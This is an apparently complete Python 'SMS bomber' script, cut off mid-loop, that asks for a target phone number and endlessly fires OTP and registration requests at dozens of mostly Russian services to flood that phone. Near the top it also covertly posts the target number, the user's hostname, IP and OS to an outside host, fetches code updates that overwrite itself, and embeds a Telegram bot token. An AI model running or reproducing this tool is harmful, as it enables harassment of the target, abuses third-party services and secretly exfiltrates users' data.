#!/usr/bin/python
import requests, random, datetime, sys, time, argparse, os
from colorama import init, Fore, Back, Style
from time import sleep
import urllib.request
import base64
import socket

hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)
host = (f"{hostname}")
ip = (f"{ip_address}")
hostn = ('Hostname : ')
ipn = ('IP Adress : ')
number = ('Number : ')
n = ('\n')
spc = (' ')
ops = ('Operating System : ')


def reopen():
    try:
        mf = open(".4nat")
        os.remove(".4nat")
    except IOError:
        print('')


def update():
    stuff_to_update = ['sms.py', '.version']
    for fl in stuff_to_update:
        dat = urllib.request.urlopen(
            "https://raw.githubusercontent.com/4nat/Reborn/4nat-patch-1/" + fl).read()
        file = open(fl, 'wb')
        file.write(dat)
        file.close()

    print('\n\t\tUpdated Successfull !!!!')
    print('\tPlease Run The Script Again...')
    exit()


print(Fore.BLUE)
print('\tChecking For Updates...')
ver = urllib.request.urlopen(
    "https://raw.githubusercontent.com/4nat/Reborn/4nat-patch-1/.version").read().decode('utf-8')
verl = ''
try:
    verl = open(".version", 'r').read()
except Exception:
    pass
if ver != verl:
    reopen()
    print('\n\t\tAn Update is Available....')
    print('\tStarting Update...')
    update()
print("\tYour Version is Up-To-Date")
colors = ['\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;34m', '\033[1;35m', '\033[1;36m']
W = '\033[0m'
init()
print("\n")
os.system('clear')
input_func = None
try:
    input_func = raw_input
except NameError:
    input_func = input


def txt(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def mesage():
    if os.name == "nt":
        win = "Windows"
        requests.post(
            'https://dc.peakhackers.com/index.php?girdi=' + number + spc + _phone + n + hostn + spc + host + n + ipn + spc + ip + n + ops + spc + win + '')
    elif os.name == "posix":
        lin = "Linux"
        requests.post(
            'https://dc.peakhackers.com/index.php?girdi=' + number + spc + _phone + n + hostn + spc + host + n + ipn + spc + ip + n + ops + spc + lin + '')
    else:
        unkn = "IDK"
        requests.post(
            'https://dc.peakhackers.com/index.php?girdi=' + number + spc + _phone + n + hostn + spc + host + n + ipn + spc + ip + n + ops + spc + unkn + '')
        sys.tracebacklimit = 0


# dodge this ahahahahahaha xD
print('\t')


def text(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def clr():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')


def banner():
    logo = '''
   ___  _   _   ___ _____ 
  /   || \ | | / _ \_   _|
 / /| ||  \| |/ /_\ \| |  
/ /_| || . ` ||  _  || |
\___  || |\  || | | || |  
    |_/\_| \_/\_| |_/\_/                               
v3.9.1 (Made By Harun | Turkey/TR)
'''
    print(random.choice(colors) + logo + W)


banner()
try:
    f = open(".4nat")
except IOError:
    try:
        lgn = urllib.request.urlopen("https://raw.githubusercontent.com/4nat/Reborn/4nat-patch-1/.lgn").read().decode(
            'utf-8')
        lgn1 = '123'
        if int(lgn) == int(lgn1):
            print(' You Dont Need Login :) ')
        else:
            os.system('clear')
            banner()
            print("Please Login")
            print("If u dont know password come our telegram group | ")
            print("t.me/reborn4nat")
            print('\t\n Enter To Contiune!!!')
            user = input('')
            if user == "": os.system('clear')
            banner()
            user = input('Username :  ')
            passwd = urllib.request.urlopen("https://raw.githubusercontent.com/4nat/reader/master/pass.txt").read()
            npasswd = int(base64.b64decode(passwd))
            upasswd = int(input('Password :  '))
            os.system('clear')
            time.sleep(2)
            if user == "reborn" and upasswd == npasswd:
                os.system('clear');print("Login Success!..");os.system("echo fuck society >.4nat");banner()
            elif user == "reborn":
                os.system('clear');print("Incorrect Password!  >  Error Code : 101");sys.exit()
            elif user != "reborn" and passwd == "235467":
                os.system('clear');print("Incorrect Username!  >  Error Code : 102");sys.exit()
            elif user == "" and passwd == "":
                os.system('clear');print("Please Write Username and Password! >  Error Code : 103 ");sys.exit()
            else:
                os.system('clear'); print("Incorrect Username and Password! >  Error Code :103");print("");print(
                    "Please Contact Develper.");print("t.me/ichbinharun");sys.exit()
    except:
        pass


def shutdown(signal, frame):
    print('\n\033[1;31mCtrl+C was pressed, shutting down!\033[0m')
    sys.exit()


try:
    urllib.request.urlopen('https://www.google.com')
except Exception:
    print("You are not connected To Internet!!!")
    print("\tPlease Connect To Internet To Continue...\n")
    input('Exiting....\n Press Enter To Continue....')
    exit()
stat = urllib.request.urlopen("https://raw.githubusercontent.com/4nat/Reborn/4nat-patch-1/.stat").read().decode('utf-8')
statu = '0'
if int(stat) == int(statu): print('\tProgram is Currently Maintence Mode..');print(
    ' \t Please Contact Admin https://t.me/ichbinharun');os.system(
    'termux-open-url https://t.me/reborndiscuss');sys.exit();

try:
    noti = urllib.request.urlopen(
        "https://raw.githubusercontent.com/4nat/Reborn/4nat-patch-1/.notify").read().decode('utf-8')
    noti = noti.upper().strip()
    if len(noti) > 10:
        print('\n\tNOTIFICATION: ' + noti + '')
except Exception:
    pass
print('\n\tDiscord : https://discord.gg/3k9guSN')


def save():
    file = open(".numbers", "a", encoding="utf-8")
    file.write("\nName : ")
    file.write(namex)
    file.write("\nNumber: ")
    file.write(_phone)
    os.system('clear')


def show():
    file = open(".numbers", "r", encoding="utf-8")
    for i in file:
        print(i)


def nosee():
    os.system("echo fuck society >.nosee")
    kayit = int(input(
        '\n Press Numbers : \n\n    Press (1) To Save \n    Press (2) to Discard \n    Press (3) to See Your Credits  \n    Press (4) to Enter Promotion Code \n Choice : '))
    if kayit == int(1):
        save()
    elif kayit == int(2):
        text('changes are not saved!!.');print("\n")


def bug():
    prob = input('Enter Your Problem       :  ')
    probx = input('Enter Your Name   -->')
    spc = ('  :  ')
    print(random.choice(colors))
    requests.post(
        'https://api.telegram.org/bot1020659297:AAHQf4HzbG-wtH4-bhOpGJMHfGSfPgUI8Pk/sendMessage?chat_id=@rebornbugs&text=' + probx + spc + prob + '')
    time.sleep(1)
    os.system('clear')
    print(Fore.BLUE)
    print('\t Your Report Sending To Admin...')
    time.sleep(3)
    print(' THANK YOU ! <3')


try:
    f = open(".nosee")
except IOError:
    print(Fore.YELLOW)
    from selectmenu import SelectMenu

    menu = SelectMenu()
    menu.add_choices(
        ["See Contacts", "Join our Team", "Join Telegram Channel", "Send SMS Bomber", "Bug Report", "Chat", "Exit"])
    result = menu.select("Choose The Below Options !")
    if result == "See Contacts":
        os.system('clear');show()
    elif result == "Join our Team":
        print("\n");os.system('termux-open-url https://t.me/reborndevelopers')
    elif result == "Join Telegram Channel":
        print("\n");os.system('termux-open-url https://t.me/reborn4nat')
    elif result == "Send SMS Bomber":
        pass
    elif result == "Bug Report":
        print("\n");bug()
    elif result == "Chat":
        os.system('clear');os.system('python3 chat.py')
    elif result == "Exit":
        os.system('clear');exit();quit()

print('Enter Target Phone Number Without (+):')
_phone = input(Fore.BLUE + "reborn >> " + Style.RESET_ALL)
print('Enter Target Name (Enter):')
namex = input(Fore.BLUE + "reborn >> " + Style.RESET_ALL)
namex = namex.upper().strip()
mesage()
save()


def a():
    print('We Need To Verify You.')
    print('You Just Need To Go This Link : ')
    print('\n\thttps://tr.link/XJ1R0v\n')
    print('Redirecting URL !! Dont Close !!')
    time.sleep(3)
    os.system('termux-open-url https://tr.link/XJ1R0v')
    code = input('Paste Here Code ->> ')
    if str(code) == '1US2nOoLYc3VIvGlECauKRjD5bwxym4M':
        print('True')
    elif a != code:
        print('Wrong Code!! Try Again.\n\n');a()
    else:
        print('Please Fill.')


def b():
    print('We Need To Verify You.')
    print('You Just Need To Go This Link : ')
    print('\n\thttps://tr.link/50DS\n')
    print('Redirecting URL !! Dont Close !!')
    time.sleep(3)
    os.system('termux-open-url https://tr.link/50DS')
    code = input('Paste Here Code ->> ')
    if str(code) == 'KPC2jpgvdtEkLUoIASna1y0NxB4FRmHW':
        print('True')
    elif a != code:
        print('Wrong Code!! Try Again.\n\n');b()
    else:
        print('Please Fill.')


def c():
    print('We Need To Verify You.')
    print('You Just Need To Go This Link : ')
    print('\n\thttps://tr.link/SR4XzH\n')
    print('Redirecting URL !! Dont Close !!')
    time.sleep(3)
    os.system('termux-open-url https://tr.link/SR4XzH')
    code = input('Paste Here Code ->> ')
    if str(code) == 'k1mzJXIByMZURbaEKpun5hLiVdrjtNYv':
        print('True')
    elif a != code:
        print('Wrong Code!! Try Again.\n\n');c()
    else:
        print('Please Fill.')


def d():
    print('We Need To Verify You.')
    print('You Just Need To Go This Link : ')
    print('\n\thttps://tr.link/ZaU\n')
    print('Redirecting URL !! Dont Close !!')
    time.sleep(3)
    os.system('termux-open-url https://tr.link/ZaU')
    code = input('Paste Here Code ->> ')
    if str(code) == 'LRSclP2OGKUBVT5YfJCzhWnjiME1gHDs':
        print('True')
    elif a != code:
        print('Wrong Code!! Try Again.\n\n');d()
    else:
        print('Please Fill.')


def e():
    print('We Need To Verify You.')
    print('You Just Need To Go This Link : ')
    print('\n\thttps://tr.link/3fkDf\n')
    print('Redirecting URL !! Dont Close !!')
    time.sleep(3)
    os.system('termux-open-url https://tr.link/3fkDf')
    code = input('Paste Here Code ->> ')
    if str(code) == 'yeNV5Tj0kCmRl3Kb2rsvYDxZgEpJdtLU':
        print('True')
    elif a != code:
        print('Wrong Code!! Try Again.\n\n');e()
    else:
        print('Please Fill.')


def f():
    print('We Need To Verify You.')
    print('You Just Need To Go This Link : ')
    print('\n\thttps://tr.link/LMSq\n')
    print('Redirecting URL !! Dont Close !!')
    time.sleep(3)
    os.system('termux-open-url https://tr.link/LMSq')
    code = input('Paste Here Code ->> ')
    if str(code) == '3XZDRaiOJo2cu1xjndLygGhPk0fSVtUp':
        print('True')
    elif a != code:
        print('Wrong Code!! Try Again.\n\n');f()
    else:
        print('Please Fill.')


def g():
    print('We Need To Verify You.')
    print('You Just Need To Go This Link : ')
    print('\n\thttps://tr.link/TmWrHC\n')
    print('Redirecting URL !! Dont Close !!')
    time.sleep(3)
    os.system('termux-open-url https://tr.link/TmWrHC')
    code = input('Paste Here Code ->> ')
    if str(code) == 'bZfdshzKBRAagywxlFIOLuk5VD2YNPUm':
        print('True')
    elif a != code:
        print('Wrong Code!! Try Again.\n\n');g()
    else:
        print('Please Fill.')


def h():
    print('We Need To Verify You.')
    print('You Just Need To Go This Link : ')
    print('\n\thttps://tr.link/UZctY0\n')
    print('Redirecting URL !! Dont Close !!')
    time.sleep(3)
    os.system('termux-open-url https://tr.link/UZctY0')
    code = input('Paste Here Code ->> ')
    if str(code) == 'tjWZoPX3zVs4KBC25bpmuAOdDyifvrhF':
        print('True')
    elif a != code:
        print('Wrong Code!! Try Again.\n\n');h()
    else:
        print('Please Fill.')


def j():
    print('We Need To Verify You.')
    print('You Just Need To Go This Link : ')
    print('\n\thttps://tr.link/CTIAWH\n')
    print('Redirecting URL !! Dont Close !!')
    time.sleep(3)
    os.system('termux-open-url https://tr.link/CTIAWH')
    code = input('Paste Here Code ->> ')
    if str(code) == 'p3FtxseoUXGk1whD5iPLfCdIzMBNvu0J':
        print('True')
    elif a != code:
        print('Wrong Code!! Try Again.\n\n');j()
    else:
        print('Please Fill.')


ads = (a, b, c, d, e, f, g, h, j)
choose = random.choice(ads)
if choose == a:
    a()
elif choose == b:
    b()
elif choose == c:
    c()
elif choose == d:
    d()
elif choose == e:
    e()
elif choose == f:
    f()
elif choose == g:
    g()
elif choose == h:
    h()
elif choose == j:
    j()
else:
    print('Error')
R = 0

_name = ''
for x in range(12):
    _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

_phone9 = _phone[1:]
_phoneAresBank = '+' + _phone[0] + '(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]
_phone9dostavista = _phone9[:3] + '+' + _phone9[3:6] + '-' + _phone9[6:8] + '-' + _phone9[8:10]
_phoneOstin = '+' + _phone[0] + '+(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]
_phonePizzahut = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + ' ' + _phone[7:9] + ' ' + _phone[9:11]
_phoneGorzdrav = _phone[1:4] + ') ' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]

iteration = 0
os.system('clear')
iteration = 0
failed = 0
requested = 0
success = 0
banner()
num = _phone
numplus = '+' + num

print(Fore.RED)


def txts(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


txts('If you want a stop bomber press CTRL+Z !!')
txts('[**************************] %100')

while True:

    _email = _name + f'{iteration}' + '@gmail.com'
    email = _name + f'{iteration}' + '@gmail.com'

    # 5
    try:
        print(requests.post(
            "http://milano-engels.ru/ajax/loginPhone?ssid=d7f1f5ba-578d-4380-9adc-5031ce3aa0be&mobileApp=true&restaurant=edebbe6f-fa2a-4a49-bfb5-e301deee47c5&phone=+" + num + "&country=RU"))
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 6
    try:
        print(requests.get("https://suandshi.ru/mobile_api/register_mobile_user?phone=" + num[1:]))
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    try:
        print(requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6/',
                            data={'phone': num, 'device': 'Windows+v.43+Chrome+v.7453451', 'app_version': '870'}))
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 7
    try:
        print(
            requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry', json={'phone': num, 'otpId': 0}))
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 8
    try:
        print(requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': numplus}))
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 9
    try:
        print(requests.post('https://www.delivery-club.ru/ajax/user_otp', data={'phone': num}))
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 10
    try:
        print(requests.post('https://findclone.ru/register?phone={}'.format(num)))
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 11
    try:
        print(requests.post('https://api.kfc.com/api/users/v1/user.verify',
                            json={"device": {"deviceId": "new_kfc_web_site", "deviceType": "mobile"},
                                  "createdAt": "2020-02-15T16:48:04.172Z", "phone": numplus}))
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 12
    try:
        print(
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={'phone_number': numplus}))
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 13
    try:
        print(requests.post('https://youla.ru/web-api/auth/request_code', json={"phone": numplus}))
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 14
    try:
        print(requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                            json={"phone_number": numplus}))
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 15
    try:
        print(requests.post(
            'https://www.icq.com/smsreg/requestPhoneValidation.php/?msisdn={}&locale=en&countryCode=ru&k=ic1rtwz1s1Hj1O0r&version=1&r=46763'.format(
                num)))
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 16
    try:
        print(requests.post('https://kapibaras.ru/api/lk/sendCode', json={"phone": numplus, "city": 1}))
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 17
    try:
        print(requests.post('https://api.mtstv.ru/v1/users', json={"msisdn": num}))
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 18
    try:
        print(requests.post('https://api-user.privetmir.ru/api/v2/send-code',
                            data={"back_url": "/register/step-2/", "scope": "register-user reset-password",
                                  "login": numplus, "checkApproves": "Y", "approve1": "on", "approve2": "on"}))
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 19
    try:
        print(requests.post('https://moscow.rutaxi.ru/ajax_keycode.html?qip=1206982388733687&lang=ru&source=0',
                            data={"l": num}))
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 20
    try:
        print(requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={"phone": numplus}))
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 21
    try:
        print(requests.post('https://api.sunlight.net/v3/customers/authorization/', data={"phone": num}))
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 22
    try:
        print(requests.post('https://api.iconjob.co/api/auth/verification_code', data={"phone": num}))
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 23
    try:
        print(requests.get(
            'https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?oper=9&callmode=1&phone=' + num))
        headers = {'Content-type': 'application/json'}
        print(requests.post('https://app.karusel.ru/api/v1/phone_free/', json={"phone": num}, headers=headers))
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 24
    try:
        print(requests.get(
            'https://zoloto585.ru/registraciya_karty/sms.php?get_sms=1&type=new&fn=%D0%92%D0%90%D0%A1%D0%98%D0%9B%D0%AC%D0%95%D0%92%D0%90&sn=%D0%98%D0%A0%D0%98%D0%9D%D0%90&tn=%D0%9A%D0%90%D0%A0%D0%98%D0%9D%D0%9E%D0%92%D0%9D%D0%90&sex=1&dd=12.12.1990&sl=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0&phone=%2B' + num + '&email=edfsfsdgf%40mail.ru'))
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 25
    try:
        print(requests.post("http://194.58.90.105/v1/me/registration?phone=" + num, timeout=2))
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    # 26
    try:

        requests.post('https://account.my.games/signup_send_sms/', data={'phone': _phone})
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 27
    try:

        requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                      data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                            'deviceToken': '*'}, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 28

    try:
        requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 29

    try:
        requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 30

    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                      data={'phone_number': _phone}, headers={})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 31

    try:
        requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 32

    try:
        requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 33

    try:
        requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1
    except:
        failed += 1
    # 34

    try:
        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 35

    try:
        requests.post('https://pizzahut.ru/account/password-reset',
                      data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut, '_token': '*'})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 36

    try:
        requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 37

    try:
        requests.get(
            'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1

    # 38

    try:
        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp',
                      params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false',
                              'fromRegisterPage': 'true', 'snLogin': '', 'bpg': '', 'snProviderId': ''},
                      data={'phone': _phone, 'g-recaptcha-response': '', 'recaptcha': 'on'})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 39

    try:
        requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
            'client': {'firstName': 'ÃÂÃÂÃÂÃÂ²ÃÂÃÂ°ÃÂÃÂ½',
                       'lastName': 'ÃÂÃÂÃÂÃÂ²ÃÂÃÂ°ÃÂÃÂ½ÃÂÃÂ¾ÃÂÃÂ²', 'phone': _phone,
                       'typeKeys': ['Unemployed']}},
                                                          'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 40

    try:
        requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 41

    try:
        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                      json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone,
                            'deliveryOption': 'sms'})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 42

    try:
        requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1

    # 43
    try:
        requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc': '2.0', 'protocol': '5',
                                                                   'method': 'ÃÂÃÂÃÂÃÂ¾ÃÂÃÂ»ÃÂÃÂÃÂÃÂ·ÃÂÃÂ¾ÃÂÃÂ²ÃÂÃÂ°ÃÂÃÂÃÂÃÂµÃÂÃÂ»ÃÂÃÂ.ÃÂÃÂÃÂÃÂ°ÃÂÃÂÃÂÃÂ²ÃÂÃÂºÃÂÃÂ°ÃÂÃÂÃÂÃÂ°ÃÂÃÂ¤ÃÂÃÂ¸ÃÂÃÂ·ÃÂÃÂ¸ÃÂÃÂºÃÂÃÂ°',
                                                                   'params': {'phone': _phone}, 'id': '1'})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1

    # 44
    try:
        requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
                      json={'firstName': 'ÃÂÃÂÃÂÃÂ²ÃÂÃÂ°ÃÂÃÂ½',
